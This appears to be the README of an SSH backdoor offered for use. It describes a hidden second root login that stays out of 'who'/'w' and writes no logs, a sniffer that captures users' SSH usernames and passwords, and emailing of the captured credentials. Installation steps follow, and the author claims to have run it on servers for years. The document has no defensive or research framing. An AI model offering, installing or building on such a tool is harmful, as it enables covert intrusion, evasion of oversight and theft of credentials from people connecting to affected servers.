Hello.

This is a SSH BackDoor, it's created by me long time ago, and i've used it to monitorize users on my servers. It include a sniffer (connection sniffer) saving all Users and Password of users connecting to/from server.
Root logged in with BackDoor can't be saw in "who"/"w" but root can see anything what's happen on server. Also logged in with BackDoor pass wont save any logs/connection logs.
Practically server will have 2x root users
    1. normal root user (with his password)
    2. backdoor root user (with his password)
It have also sendmail for sniffer (send in email the connection logs)
it works on Linux/Solaris/Darwin/BSD

Install note:

edit backdoor.h (there you configure your password/sniffer/email)

./setup

enjoy it. ps: i have servers installed with this backdoor from years *uptime +1500 days.
